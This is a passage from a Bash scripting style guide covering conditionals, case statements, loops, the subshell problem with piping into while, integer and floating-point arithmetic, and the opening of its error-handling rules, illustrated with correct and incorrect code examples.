**Arithmetic conditionals - use `(())`:**

```bash
# ✓ Correct - natural C-style syntax
((count > 0)) && echo "Count: $count"
((i >= MAX)) && die 1 'Limit exceeded'

# ✗ Wrong - using [[ ]] for arithmetic (verbose)
[[ "$count" -gt 0 ]]  # Unnecessary

# Operators: > >= < <= == !=
((a > b))   # Greater than
((a >= b))  # Greater or equal
```

**Pattern matching:**

```bash
# Glob pattern
[[ "$filename" == *.@(jpg|png|gif) ]] && process_image "$filename"

# Regular expression
if [[ "$email" =~ ^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$ ]]; then
  echo "Valid email"
else
  die 22 "Invalid email: $email"
fi

# Case-insensitive (bash 3.2+)
shopt -s nocasematch
[[ "$input" == "yes" ]]  # Matches YES, Yes, yes
shopt -u nocasematch
```

**Short-circuit evaluation:**

```bash
# Execute second only if first succeeds
[[ -f "$config" ]] && source "$config"
((DEBUG)) && set -x

# Execute second only if first fails
[[ -d "$dir" ]] || mkdir -p "$dir"
((count > 0)) || die 1 'No items to process'
```

**Anti-patterns:**

```bash
# ✗ Wrong - using old [ ] syntax
[ -f "$file" ]  # Use [[ ]] instead

# ✗ Wrong - using -a and -o in [ ]
[ -f "$file" -a -r "$file" ]  # Deprecated, fragile

# ✓ Correct - use [[ ]] with && and ||
[[ -f "$file" && -r "$file" ]]

# ✗ Wrong - arithmetic with [[ ]] using -gt/-lt
[[ "$count" -gt 10 ]]  # Verbose

# ✓ Correct - use (()) for arithmetic
((count > 10))
```

**File test operators (use with `[[ ]]`):**

| Operator | Meaning |
|----------|---------|
| `-e file` | File exists |
| `-f file` | Regular file |
| `-d dir` | Directory |
| `-r file` | Readable |
| `-w file` | Writable |
| `-x file` | Executable |
| `-s file` | Not empty (size > 0) |
| `-L link` | Symbolic link |
| `file1 -nt file2` | file1 newer than file2 |
| `file1 -ot file2` | file1 older than file2 |

**String test operators (use with `[[ ]]`):**

| Operator | Meaning |
|----------|---------|
| `-z "$str"` | String is empty (zero length) |
| `-n "$str"` | String is not empty |
| `"$a" == "$b"` | Strings are equal |
| `"$a" != "$b"` | Strings are not equal |
| `"$a" < "$b"` | Lexicographic less than |
| `"$a" > "$b"` | Lexicographic greater than |
| `"$str" =~ regex` | String matches regex |
| `"$str" == pattern` | String matches glob pattern |


---


**Rule: BCS0502**

## Case Statements

**Use `case` for multi-way branching on pattern matching. More readable and efficient than long `if/elif` chains when testing single value against multiple patterns. Use compact format for simple single-action cases, expanded for multi-line logic.**

**Rationale:**
- Clearer than if/elif for pattern-based branching; native wildcard, alternation, character class support
- Faster than multiple if/elif tests - single evaluation
- Easy to add/reorder cases; default `*)` ensures exhaustive matching
- Perfect for argument parsing; column alignment makes structure obvious

**When to use case vs if/elif:**

```bash
# ✓ Use case - testing single variable against multiple values
case "$action" in
  start) start_service ;;
  stop) stop_service ;;
  *) die 22 "Invalid action: $action" ;;
esac

# ✓ Use case - pattern matching needed
case "$filename" in
  *.txt) process_text_file ;;
  *.pdf) process_pdf_file ;;
esac

# ✗ Use if/elif - testing different variables or complex conditions
if [[ ! -f "$file" ]]; then die 2 "Not found"; fi
if [[ "$count" -gt 100 && "$verbose" -eq 1 ]]; then info 'Large verbose batch'; fi

# ✗ Use if/elif - numeric ranges
if ((value < 0)); then error='negative'; elif ((value <= 10)); then category='small'; fi
```

**Case expression quoting:**

Case expression doesn't require quoting - word splitting doesn't apply:

```bash
# ✓ CORRECT - no quotes needed on case expression
case ${1:-} in
  --help) usage ;;
esac

# ✗ UNNECESSARY - quotes don't add value
case "${1:-}" in
  --help) usage ;;
esac
```

**Compact format** - single action per case, all on same line:

```bash
while (($#)); do
  case $1 in
    -v|--verbose) VERBOSE=1 ;;
    -n|--dry-run) DRY_RUN=1 ;;
    -f|--force)   FORCE=1 ;;
    -h|--help)    usage; exit 0 ;;
    -o|--output)  noarg "$@"; shift; OUTPUT_FILE="$1" ;;
    --)           shift; break ;;
    -*)           die 22 "Invalid option: $1" ;;
    *)            INPUT_FILES+=("$1") ;;
  esac
  shift
done
```

**Expanded format** - multi-line actions with `;;` on separate line:

```bash
while (($#)); do
  case $1 in
    -b|--builtin)     INSTALL_BUILTIN=1
                      ((VERBOSE)) && info 'Builtin enabled'
                      ;;

    -p|--prefix)      noarg "$@"
                      shift
                      PREFIX="$1"
                      BIN_DIR="$PREFIX/bin"
                      ;;

    --)               shift
                      break
                      ;;

    -*)               error "Invalid option: $1"
                      usage
                      exit 22
                      ;;
  esac
  shift
done
```

**Pattern matching syntax:**

```bash
# Literal patterns
case "$value" in
  start) echo 'Starting...' ;;
  stop) echo 'Stopping...' ;;
esac

# Wildcard patterns
case "$filename" in
  *.txt) echo 'Text file' ;;
  ??) echo 'Two-character' ;;
  /usr/*) echo 'System path' ;;
esac

# Alternation (OR patterns)
case "$option" in
  -h|--help|help) usage; exit 0 ;;
  *.txt|*.md) echo 'Text document' ;;
esac

# Character classes (with extglob)
shopt -s extglob
case "$input" in
  test?(s)) echo 'test or tests' ;;           # zero or one
  log+([0-9]).txt) echo 'log + digits' ;;      # one or more
  @(start|stop)) echo 'Valid action' ;;        # exactly one
  !(*.tmp|*.bak)) echo 'Not temp/backup' ;;    # anything except
esac

# Bracket expressions
case "$char" in
  [0-9]) echo 'Digit' ;;
  [a-z]) echo 'Lowercase' ;;
  [!a-zA-Z0-9]) echo 'Special character' ;;
esac
```

**File type routing:**

```bash
process_file_by_type() {
  local -- file="$1"
  local -- filename="${file##*/}"

  case "$filename" in
    *.txt|*.md|*.rst)   process_text "$file" ;;
    *.jpg|*.png|*.gif)  process_image "$file" ;;
    *.sh|*.bash)        validate_script "$file" ;;
    .*)                 warn "Skipping hidden: $file"; return 0 ;;
    *.tmp|*.bak|*~)     warn "Skipping temp: $file"; return 0 ;;
    *)                  error "Unknown type: $file"; return 1 ;;
  esac
}
```

**Anti-patterns:**

```bash
# ✗ Quoting literal patterns unnecessarily
case "$value" in
  "start") echo 'Starting...' ;;    # Don't quote
esac
# ✓ Correct
case "$value" in
  start) echo 'Starting...' ;;
esac

# ✗ Missing default case - silent failure!
case "$action" in
  start) start_service ;;
  stop) stop_service ;;
esac
# ✓ Always include default
case "$action" in
  start) start_service ;;
  stop) stop_service ;;
  *) die 22 "Invalid: $action" ;;
esac

# ✗ Inconsistent format mixing
case "$opt" in
  -v) VERBOSE=1 ;;
  -o) shift
      OUTPUT="$1"
      ;;                 # Mixed compact/expanded
esac
# ✓ Pick one format, be consistent

# ✗ Poor column alignment
case $1 in
  -v|--verbose) VERBOSE=1 ;;
  -f|--force) FORCE=1 ;;
esac
# ✓ Align consistently
case $1 in
  -v|--verbose) VERBOSE=1 ;;
  -f|--force)   FORCE=1 ;;
esac

# ✗ Fall-through (not supported in Bash)
case "$code" in
  200|201) success='true'
  300|301) redirect='true' ;;    # Won't work!
esac
# ✓ Explicit pattern grouping
case "$code" in
  200|201) success='true' ;;
  300|301) redirect='true' ;;
esac

# ✗ Regex syntax (not supported)
case "$input" in
  [0-9]+) echo 'Number' ;;    # Matches single digit only!
esac
# ✓ Use extglob or if with regex
case "$input" in
  +([0-9])) echo 'Number' ;;  # Requires extglob
esac

# ✗ Side effects in patterns
case "$value" in
  $(func)) echo 'Match' ;;  # Function called every case!
esac
# ✓ Evaluate once before
result=$(func)
case "$value" in "$result") echo 'Match' ;; esac

# ✗ Nested case for multiple variables
case "$var1" in
  val1) case "$var2" in val2) action ;; esac ;;
esac
# ✓ Use if for multiple variable tests
if [[ "$var1" == val1 && "$var2" == val2 ]]; then action; fi
```

**Edge cases:**

```bash
# Empty string handling
case "$value" in
  '') echo 'Empty string' ;;
  ''|' '|$'\t') echo 'Blank or whitespace' ;;
  *) echo "Value: $value" ;;
esac

# Special characters - quote patterns
case "$filename" in
  'file (1).txt') echo 'Match parentheses' ;;
  'file$special.txt') echo 'Match dollar sign' ;;
esac

# Numeric patterns (as strings)
case "$port" in
  80|443) echo 'Web port' ;;
  [0-9][0-9][0-9][0-9]) echo 'Four-digit port' ;;
esac
# For numeric comparison, use (()) instead

# Return values in functions
validate_input() {
  local -- input="$1"
  case "$input" in
    [a-z]*) return 0 ;;
    [A-Z]*) return 1 ;;
    '') return 22 ;;
    *) return 1 ;;
  esac
}
```

**Summary:**
- **Use case for pattern matching** single variable against multiple patterns
- **Compact format** for single-line actions; **expanded** for multi-line
- **Quote test variable** `case "$var" in` - **don't quote literal patterns**
- **Always include `*)` default** to handle unexpected values
- **Use alternation** `pattern1|pattern2)` for multiple matches
- **Enable extglob** for `@()`, `!()`, `+()`, `?()`, `*()` patterns
- **Align consistently** - pick compact or expanded, maintain column alignment
- **Terminate with `;;`** - every case branch needs it
- **Use if for**: multiple variables, numeric ranges, complex conditions


---


**Rule: BCS0503**

## Loops

**Use loops to iterate over collections, process command output, or repeat operations. Prefer array iteration over string parsing, use process substitution to avoid subshell issues, and employ proper loop control with `break` and `continue`.**

**Rationale:**
- **Collection Processing**: For loops iterate over arrays, globs, ranges
- **Stream Processing**: While loops process line-by-line input
- **Array Safety**: `"${array[@]}"` preserves element boundaries
- **Process Substitution**: `< <(command)` avoids subshell variable scope issues
- **Loop Control**: Break/continue enable early exit and conditional processing

**For loops - Array iteration:**

```bash
# ✓ Iterate over array elements
local -a files=('document.txt' 'file with spaces.pdf')
local -- file
for file in "${files[@]}"; do
  [[ -f "$file" ]] && info "Processing: $file"
done

# ✓ Iterate with index and value
local -a items=('alpha' 'beta' 'gamma')
local -i index
for index in "${!items[@]}"; do
  info "Item $index: ${items[$index]}"
done

# ✓ Iterate over arguments
for arg in "$@"; do info "Argument: $arg"; done
```

**For loops - Glob patterns:**

```bash
# ✓ Iterate over glob matches (nullglob ensures empty loop if no matches)
for file in "$SCRIPT_DIR"/*.txt; do info "Processing: $file"; done

# ✓ Multiple glob patterns
for file in "$SCRIPT_DIR"/*.{txt,md,rst}; do
  [[ -f "$file" ]] && info "Processing: $file"
done

# ✓ Recursive glob (requires globstar)
shopt -s globstar
for script in "$SCRIPT_DIR"/**/*.sh; do
  [[ -f "$script" ]] && shellcheck "$script"
done

# ✓ Check if glob matched anything
local -a matches=("$SCRIPT_DIR"/*.log)
[[ ${#matches[@]} -eq 0 ]] && return 1
```

**For loops - C-style and brace expansion:**

```bash
# ✓ C-style for loop (use i+=1, never i++)
local -i i
for ((i=1; i<=10; i+=1)); do echo "Count: $i"; done

# ✓ Countdown with step
for ((i=seconds; i>0; i-=1)); do echo "T-minus $i"; sleep 1; done

# Range and step expansion (Bash 4+)
for i in {1..10}; do echo "$i"; done
for i in {0..100..10}; do echo "Multiple of 10: $i"; done
for letter in {a..z}; do echo "$letter"; done

# Zero-padded numbers
for file in file{001..100}.txt; do echo "$file"; done
```

**While loops - Reading input:**

```bash
# ✓ Read file line by line
local -- line; local -i line_count=0
while IFS= read -r line; do
  ((line_count+=1))
done < "$file"

# ✓ Process command output (avoid subshell)
while IFS= read -r line; do ((count+=1)); done < <(find . -name '*.txt')

# ✓ Read null-delimited input (safe for filenames with newlines)
while IFS= read -r -d '' file; do
  info "Processing: $file"
done < <(find . -name '*.sh' -print0)

# ✓ Read CSV with custom delimiter
while IFS=',' read -r name email age; do info "$name, $email, $age"; done < "$csv"

# ✓ Read with timeout
read -r -t 10 input || warn 'Timed out'
```

**While loops - Argument parsing:**

```bash
while (($#)); do
  case $1 in
    -v|--verbose) VERBOSE=1 ;;
    -o|--output)  noarg "$@"; shift; OUTPUT_DIR="$1" ;;
    --)           shift; break ;;
    -*)           die 22 "Invalid option: $1" ;;
    *)            INPUT_FILES+=("$1") ;;
  esac
  shift
done
INPUT_FILES+=("$@")  # Collect remaining arguments after --
```

**While loops - Condition-based:**

```bash
# ✓ Wait for condition with timeout
wait_for_file() {
  local -- file="$1"; local -i timeout="${2:-30}" elapsed=0
  while [[ ! -f "$file" ]]; do
    ((elapsed >= timeout)) && return 1
    sleep 1; ((elapsed+=1))
  done
}

# ✓ Retry with exponential backoff
local -i attempt=1 wait_time=1
while ((attempt <= max_attempts)); do
  some_command && return 0
  ((attempt < max_attempts)) && { sleep "$wait_time"; wait_time=$((wait_time * 2)); }
  ((attempt+=1))
done
```

**Until loops:**

```bash
# ✓ Until loop (less common, for when logic reads better as "until true")
until systemctl is-active --quiet "$service"; do
  ((elapsed >= timeout)) && return 1
  sleep 1; ((elapsed+=1))
done

# ✓ Prefer while with opposite condition (usually clearer)
while [[ -f "$lock_file" ]]; do sleep 1; done  # Better than: until [[ ! -f "$lock_file" ]]
```

**Infinite loops:**

> **Performance:** `while ((1))` is fastest. `while :` is 9-14% slower (use for POSIX). `while true` is 15-22% slower (avoid).

```bash
# ✓ RECOMMENDED - Infinite loop with break condition
while ((1)); do
  systemctl is-active --quiet "$service" || error "Service down!"
  sleep "$interval"
done

# ✓ ACCEPTABLE - POSIX-compatible
while :; do process_item || break; done

# ✗ AVOID - Slowest due to command execution overhead
while true; do check_status; sleep 5; done
```

**Loop control - break and continue:**

```bash
# ✓ Early exit with break
for file in "${files[@]}"; do
  [[ "$file" =~ $pattern ]] && { found="$file"; break; }
done

# ✓ Skip items with continue
for file in "${files[@]}"; do
  [[ ! -f "$file" ]] && { ((skipped+=1)); continue; }
  [[ ! -r "$file" ]] && { ((skipped+=1)); continue; }
  # Process valid file
done

# ✓ Break out of nested loops with explicit level
for row in "${matrix[@]}"; do
  for col in $row; do
    [[ "$col" == 'target' ]] && { found=1; break 2; }
  done
done

# ✓ Continue in while loop
while IFS= read -r line; do
  [[ -z "$line" ]] && continue   # Skip empty lines
  [[ "$line" =~ ^# ]] && continue # Skip comments
  process "$line"
done < "$file"
```

**Anti-patterns:**

```bash
# ✗ Iterating over unquoted string (word splitting!)
for file in $files_str; do ...
# ✓ Iterate over array
for file in "${files[@]}"; do ...

# ✗ Parsing ls output
for file in $(ls *.txt); do ...  # NEVER
# ✓ Use glob directly
for file in *.txt; do ...

# ✗ Pipe to while (subshell - count stays 0)
count=0; cat file.txt | while read -r line; do ((count+=1)); done
# ✓ Process substitution
while read -r line; do ((count+=1)); done < <(cat file.txt)

# ✗ Unquoted array expansion
for item in ${array[@]}; do ...
# ✓ Quoted
for item in "${array[@]}"; do ...

# ✗ C-style loop with ++ (fails with set -e when i=0)
for ((i=0; i<10; i++)); do ...
# ✓ Use +=1
for ((i=0; i<10; i+=1)); do ...

# ✗ Redundant comparison
while (($# > 0)); do ...
# ✓ Arithmetic truthiness
while (($#)); do ...

# ✗ Ambiguous break in nested loops
break    # Inner only - unclear
# ✓ Explicit
break 2  # Both loops - clear

# ✗ Modifying array during iteration
for item in "${array[@]}"; do array+=("$item"); done  # Dangerous
# ✓ Create new array
for item in "${original[@]}"; do modified+=("$item"); done

# ✗ External seq command
for i in $(seq 1 10); do ...
# ✓ Brace expansion
for i in {1..10}; do ...

# ✗ Missing -r flag (backslash processing)
while read line; do ...
# ✓ Always use -r
while IFS= read -r line; do ...

# ✗ Local declared inside loop (wasteful, misleading)
for link in "$BIN_DIR"/*; do local target; target=$(readlink "$link"); done
# ✓ Declare before loop
local -- target; for link in "$BIN_DIR"/*; do target=$(readlink "$link"); done
```

**Edge cases:**

```bash
# Empty arrays - zero iterations, no errors
for item in "${empty[@]}"; do echo "$item"; done  # Never executes

# Arrays with empty elements - iterates including empty strings
array=('' 'item2' '')
for item in "${array[@]}"; do echo "[$item]"; done  # Output: [] [item2] []

# Glob with no matches (nullglob)
shopt -s nullglob
for file in /nonexistent/*.txt; do echo "$file"; done  # Never executes

# Loop variable scope - not local, persists after loop
for i in {1..5}; do :; done
echo "$i"  # Prints: 5

# IMPORTANT: Declare locals BEFORE loops
process() {
  local -- target; local -i count=0  # Declare here
  for link in "$BIN_DIR"/*; do
    target=$(readlink "$link")       # Use here
    count+=1
  done
}
```

**Summary:**
- **For loops**: arrays, globs, known ranges
- **While loops**: reading input, argument parsing, condition-based
- **Until loops**: rarely needed, prefer while with opposite condition
- **Infinite loops**: `while ((1))` fastest, `while :` POSIX, avoid `while true`
- **Always quote arrays**: `"${array[@]}"`
- **Process substitution**: `< <(command)` avoids subshell
- **Never parse ls**: use globs or find
- **Use i+=1 not i++**: ++ fails with set -e when 0
- **Arithmetic truthiness**: `while (($#))` not `while (($# > 0))`
- **Explicit break level**: `break 2` for nested loops
- **Always IFS= read -r**: preserve whitespace and backslashes
- **Declare locals before loops**: not inside

#fin


---


**Rule: BCS0504**

## Pipes to While Loops

**Avoid piping commands to while loops because pipes create subshells where variable assignments don't persist outside the loop. Use process substitution `< <(command)` or `readarray` instead. This is one of the most common and insidious bugs in Bash scripts.**

**Rationale:**

- **Variable Persistence**: Pipes create subshells; variables modified inside don't persist outside
- **Silent Failure**: No error messages - script continues with counters at 0, arrays empty
- **Process Substitution Fixes**: `< <(command)` runs loop in current shell, variables persist
- **Readarray Alternative**: For line collection, `readarray` is cleaner and faster
- **Set -e Interaction**: Failures in piped commands may not trigger `set -e` properly

**The subshell problem:**

When you pipe to while, Bash creates a subshell for the while loop. Variable modifications happen in that subshell and are lost when the pipe ends.

```bash
#  WRONG - Subshell loses variable changes
declare -i count=0

echo -e "line1\nline2\nline3" | while IFS= read -r line; do
  echo "$line"
  ((count+=1))
done

echo "Count: $count"  # Output: Count: 0 (NOT 3!)
```

**Why this happens:**

```bash
# Pipe creates process tree:
#   Parent shell (count=0)
#      └─> Subshell (while loop)
#            - Inherits count=0
#            - Modifies count (1, 2, 3)
#            - Subshell exits
#            - Changes discarded!
#   Back to parent (count still 0)
```

**Solution 1: Process substitution (most common)**

```bash
#  CORRECT - Process substitution avoids subshell
declare -i count=0

while IFS= read -r line; do
  echo "$line"
  ((count+=1))
done < <(echo -e "line1\nline2\nline3")

echo "Count: $count"  # Output: Count: 3 (correct!)
```

**Solution 2: Readarray/mapfile (when collecting lines)**

```bash
#  CORRECT - readarray reads all lines into array
declare -a lines

readarray -t lines < <(echo -e "line1\nline2\nline3")

declare -i count="${#lines[@]}"
echo "Count: $count"  # Output: Count: 3 (correct!)

# Iterate if needed
local -- line
for line in "${lines[@]}"; do
  echo "$line"
done
```

**Solution 3: Here-string (for single variables)**

```bash
#  CORRECT - Here-string when input is in variable
declare -- input=$'line1\nline2\nline3'
declare -i count=0

while IFS= read -r line; do
  echo "$line"
  ((count+=1))
done <<< "$input"

echo "Count: $count"  # Output: Count: 3 (correct!)
```

**Example 1: Counting matching lines**

```bash
#  WRONG - Counter stays 0
count_errors_wrong() {
  local -- log_file="$1"
  local -i error_count=0

  grep 'ERROR' "$log_file" | while IFS= read -r line; do
    echo "Found: $line"
    ((error_count+=1))
  done

  echo "Errors: $error_count"  # Always 0!
  return "$error_count"
}

#  CORRECT - Process substitution
count_errors_correct() {
  local -- log_file="$1"
  local -i error_count=0

  while IFS= read -r line; do
    echo "Found: $line"
    ((error_count+=1))
  done < <(grep 'ERROR' "$log_file")

  echo "Errors: $error_count"  # Correct count!
  return "$error_count"
}

#  ALSO CORRECT - Using wc (when only count matters)
count_errors_simple() {
  local -- log_file="$1"
  local -i error_count

  error_count=$(grep -c 'ERROR' "$log_file")
  echo "Errors: $error_count"
  return "$error_count"
}
```

**Example 2: Building array from command output**

```bash
#  WRONG - Array stays empty
collect_users_wrong() {
  local -a users=()

  getent passwd | while IFS=: read -r user _; do
    users+=("$user")
  done

  echo "Users: ${#users[@]}"  # Always 0!
}

#  CORRECT - Process substitution
collect_users_correct() {
  local -a users=()

  while IFS=: read -r user _; do
    users+=("$user")
  done < <(getent passwd)

  echo "Users: ${#users[@]}"  # Correct count!
  printf '%s\n' "${users[@]}"
}

#  ALSO CORRECT - readarray (simpler)
collect_users_readarray() {
  local -a users

  readarray -t users < <(getent passwd | cut -d: -f1)

  echo "Users: ${#users[@]}"
  printf '%s\n' "${users[@]}"
}
```

**Example 3: Processing files with state**

```bash
#  WRONG - State variables lost
process_files_wrong() {
  local -i total_size=0
  local -i file_count=0

  find /data -type f | while IFS= read -r file; do
    local -- size
    size=$(stat -f%z "$file" 2>/dev/null || stat -c%s "$file" 2>/dev/null)
    ((total_size+=size))
    ((file_count+=1))
  done

  echo "Files: $file_count, Total: $total_size"  # Both 0!
}

#  CORRECT - Process substitution
process_files_correct() {
  local -i total_size=0
  local -i file_count=0

  while IFS= read -r file; do
    local -- size
    size=$(stat -f%z "$file" 2>/dev/null || stat -c%s "$file" 2>/dev/null)
    ((total_size+=size))
    ((file_count+=1))
  done < <(find /data -type f)

  echo "Files: $file_count, Total: $total_size"  # Correct values!
}
```

**Example 4: Multi-variable read with associative array**

```bash
#  WRONG - Associative array stays empty
parse_config_wrong() {
  local -A config=()

  cat config.conf | while IFS='=' read -r key value; do
    config[$key]="$value"
  done

  echo "Config entries: ${#config[@]}"  # 0
}

#  CORRECT - Process substitution
parse_config_correct() {
  local -A config=()

  while IFS='=' read -r key value; do
    [[ "$key" =~ ^[[:space:]]*# ]] && continue
    [[ -z "$key" ]] && continue
    config[$key]="$value"
  done < <(cat config.conf)

  echo "Config entries: ${#config[@]}"  # Correct!

  local -- k
  for k in "${!config[@]}"; do
    echo "$k = ${config[$k]}"
  done
}
```

**When readarray is better:**

```bash
#  BEST - readarray for simple line collection
declare -a log_lines
readarray -t log_lines < <(tail -n 100 /var/log/app.log)

local -- line
for line in "${log_lines[@]}"; do
  [[ "$line" =~ ERROR ]] && echo "Error: $line"
done

#  BEST - readarray with null-delimited input (safe for filenames with spaces)
declare -a files
readarray -d '' -t files < <(find /data -type f -print0)

local -- file
for file in "${files[@]}"; do
  echo "Processing: $file"
done
```

**Anti-patterns to avoid:**

```bash
#  WRONG - Pipe to while with counter
cat file.txt | while read -r line; do
  ((count+=1))
done
echo "$count"  # Still 0!

#  CORRECT - Process substitution
while read -r line; do
  ((count+=1))
done < <(cat file.txt)

#  WRONG - Pipe to while building array
find /data -name '*.txt' | while read -r file; do
  files+=("$file")
done
echo "${#files[@]}"  # Still 0!

#  CORRECT - readarray
readarray -d '' -t files < <(find /data -name '*.txt' -print0)

#  WRONG - Setting flag in piped while
has_errors=0
grep ERROR log | while read -r line; do
  has_errors=1
done
echo "$has_errors"  # Still 0!

#  CORRECT - Use return value or process substitution
if grep -q ERROR log; then
  has_errors=1
fi
```

**Edge cases:**

**1. Empty input:**

```bash
# Process substitution handles empty input correctly
declare -i count=0

while read -r line; do
  ((count+=1))
done < <(echo -n "")

echo "Count: $count"  # 0 - correct (no lines)
```

**2. Command failure in process substitution:**

```bash
# With set -e, command failure is detected
while read -r line; do
  process "$line"
done < <(failing_command)  # Script exits if failing_command fails
```

**3. Very large output:**

```bash
# readarray loads everything into memory
readarray -t lines < <(cat huge_file)  # Might use lots of RAM

# Process substitution processes line by line
while read -r line; do
  process "$line"  # Lower memory usage
done < <(cat huge_file)
```

**Summary:**

- **Never pipe to while** - creates subshell, variables don't persist
- **Use process substitution** - `while read; done < <(command)` - variables persist
- **Use readarray** - `readarray -t array < <(command)` - simple and efficient for line collection
- **Use here-string** - `while read; done <<< "$var"` - when input is in variable
- **Subshell variables are lost** - any modifications disappear when pipe ends
- **Always test with data** - empty counters/arrays indicate subshell problem

**Key principle:** Piping to while is a dangerous anti-pattern that silently loses variable modifications. Always use process substitution `< <(command)` or `readarray` instead. This is not a style preference - it's about correctness. If you find `| while read` in code, it's almost certainly a bug waiting to manifest.


---


**Rule: BCS0505**

## Arithmetic Operations

> **See Also:** BCS0201 for declaring integer variables with `declare -i`

**Declare integers explicitly:**

```bash
declare -i i j result count total
declare -i counter=0
declare -i max_retries=3
```

**Rationale for `declare -i`:** Automatic arithmetic context (no `$(())` needed), type safety, performance, clarity, BCS0201 compliance.

**Increment operations:**

```bash
# ✓ CORRECT - The ONLY acceptable form
declare -i i=0    # MUST declare as integer first
i+=1              # Clearest, safest, most readable

# ✗ WRONG - NEVER use these
((i++))           # Returns old value, fails with set -e when i=0
((++i))           # Unnecessary complexity
i++               # Syntax error outside arithmetic context
```

**Why `((i++))` is dangerous:**

```bash
set -e
i=0
((i++))  # Returns 0 (old value) = "false", script exits!
echo "This never executes"
```

**Arithmetic expressions:**

```bash
# In (()) - no $ needed
((result = x * y + z))
((total = sum / count))

# With $(()) for assignments/commands
result=$((x * y + z))
echo "$((i * 2 + 5))"
```

**Operators:**

| Operator | Meaning | Note |
|----------|---------|------|
| `+` `-` `*` `/` `%` `**` | Basic arithmetic | `/` is integer division |
| `++` `--` | Increment/Decrement | Use `i+=1` instead |
| `+=` `-=` | Compound assignment | `((i+=5))` |

**Arithmetic conditionals:**

```bash
if ((i < j)); then echo 'i is less than j'; fi
((count > 0)) && process_items
((attempts >= max_retries)) && die 1 'Too many attempts'
```

**Comparison operators:** `<` `<=` `>` `>=` `==` `!=`

**Arithmetic truthiness (non-zero = true):**

```bash
# ✓ CORRECT - use truthiness directly
declare -i count=5
if ((count)); then echo 'Has items'; fi
((VERBOSE)) && echo 'Verbose mode enabled'
((DRY_RUN)) || execute_command

# ✗ WRONG - redundant comparison
if ((count > 0)); then echo 'Has items'; fi
((VERBOSE == 1)) && echo 'Verbose mode'
```

**Complex expressions:**

```bash
((result = (a + b) * (c - d)))
((max = a > b ? a : b))         # Ternary (bash 5.2+)
((flags = flag1 | flag2))       # Bitwise OR
((masked = value & 0xFF))       # Bitwise AND
```

**Anti-patterns:**

```bash
# ✗ WRONG - [[ ]] for arithmetic (verbose, old-style)
if [[ "$exit_code" -eq 0 ]]; then echo 'Success'; fi
[[ "$count" -gt 10 ]] && process_items

# ✓ CORRECT - use (())
if ((exit_code == 0)); then echo 'Success'; fi
((count > 10)) && process_items

# ✗ WRONG - expr command (slow, external)
result=$(expr $i + $j)

# ✓ CORRECT
result=$((i + j))

# ✗ WRONG - $ inside (()) on left side
((result = $i + $j))

# ✓ CORRECT - no $ inside (())
((result = i + j))

# ✗ WRONG - unnecessary quotes
result="$((i + j))"

# ✓ CORRECT
result=$((i + j))
```

**Integer division truncates:**

```bash
((result = 10 / 3))   # result=3
((result = -10 / 3))  # result=-3

# For floating point, use bc or awk
result=$(bc <<< "scale=2; 10 / 3")  # 3.33
```

**Practical examples:**

```bash
# Loop counter
declare -i i
for ((i=0; i<10; i+=1)); do
  echo "Iteration $i"
done

# Retry logic
declare -i attempts=0 max_attempts=5
while ((attempts < max_attempts)); do
  process_item && break
  attempts+=1
  ((attempts < max_attempts)) && sleep 1
done
((attempts >= max_attempts)) && die 1 'Max attempts reached'

# Percentage calculation
declare -i total=100 completed=37
declare -i percentage=$((completed * 100 / total))
echo "Progress: $percentage%"
```


---


**Rule: BCS0506**

## Floating-Point Operations

**Rule: BCS0706**

Performing floating-point arithmetic in Bash using external tools.

---

#### Rationale

Bash supports only integer arithmetic. Use `bc` for arbitrary precision, `awk` for inline operations, `printf` for formatting. Avoid complex floating-point logic in Bash when possible.

---

#### Using bc (Basic Calculator)

```bash
# Simple calculation
result=$(echo '3.14 * 2.5' | bc -l)

# With variables
width='10.5'
height='7.25'
area=$(echo "$width * $height" | bc -l)

# Set precision (scale)
pi=$(echo 'scale=10; 4*a(1)' | bc -l)  # Pi to 10 decimal places

# Comparison (bc returns 1 for true, 0 for false)
if (($(echo "$a > $b" | bc -l))); then
  info "$a is greater than $b"
fi
```

#### Using awk

```bash
# Inline calculation
result=$(awk "BEGIN {printf \"%.2f\", 3.14 * 2.5}")

# With variables
area=$(awk -v w="$width" -v h="$height" 'BEGIN {printf "%.2f", w * h}')

# Comparison
if awk -v a="$a" -v b="$b" 'BEGIN {exit !(a > b)}'; then
  info "$a is greater than $b"
fi

# Percentage calculation
pct=$(awk -v used="$used" -v total="$total" 'BEGIN {printf "%.1f", used/total*100}')
```

#### Using printf for Formatting

```bash
printf '%.2f\n' "$value"
printf 'Area: %.2f sq units\n' "$(echo "$w * $h" | bc -l)"
```

#### Common Patterns

```bash
# Human-readable byte sizes
bytes_to_human() {
  local -i bytes=$1
  if ((bytes >= 1073741824)); then
    awk -v b="$bytes" 'BEGIN {printf "%.1fG", b/1073741824}'
  elif ((bytes >= 1048576)); then
    awk -v b="$bytes" 'BEGIN {printf "%.1fM", b/1048576}'
  elif ((bytes >= 1024)); then
    awk -v b="$bytes" 'BEGIN {printf "%.1fK", b/1024}'
  else
    echo "${bytes}B"
  fi
}

# Percentage with rounding
calc_percentage() {
  local -i part=$1 total=$2
  awk -v p="$part" -v t="$total" 'BEGIN {printf "%.0f", p/t*100}'
}
```

---

#### Anti-Patterns

```bash
# ✗ Wrong - Bash integer division loses precision
result=$((10 / 3))  # Returns 3, not 3.333

# ✓ Correct - use bc for float division
result=$(echo '10 / 3' | bc -l)  # Returns 3.333...

# ✗ Wrong - comparing floats as strings
if [[ "$a" > "$b" ]]; then  # String comparison!

# ✓ Correct - use bc or awk for numeric comparison
if (($(echo "$a > $b" | bc -l))); then
```

---

**See Also:** BCS0705 (Integer Arithmetic)

#fin


---


**Rule: BCS0600**

# Error Handling

This section establishes comprehensive error handling for robust scripts. It mandates `set -euo pipefail` (with strongly recommended `shopt -s inherit_errexit`) for automatic error detection, defines standard exit code conventions (0=success, 1=general error, 2=misuse, 5=IO error, 22=invalid argument), explains trap handling for cleanup operations, details return value checking patterns, and clarifies safe error suppression methods (`|| true`, `|| :`, conditional checks). Error handling must be configured before any other commands run.


---


**Rule: BCS0601**

## Exit on Error
```bash
set -euo pipefail
# -e: Exit on command failure
# -u: Exit on undefined variable
# -o pipefail: Exit on pipe failure
```

**Rationale:** Transforms Bash from permissive to strict mode - catches errors immediately, prevents cascading failures, makes scripts behave like compiled languages.

**Expected failure handling patterns:**

```bash
# Allow specific command to fail
command_that_might_fail || true

# Capture exit code in conditional
if command_that_might_fail; then
  echo "Success"
else
  echo "Expected failure occurred"
fi

# Temporarily disable errexit
set +e
risky_command
set -e

# Check optional variables
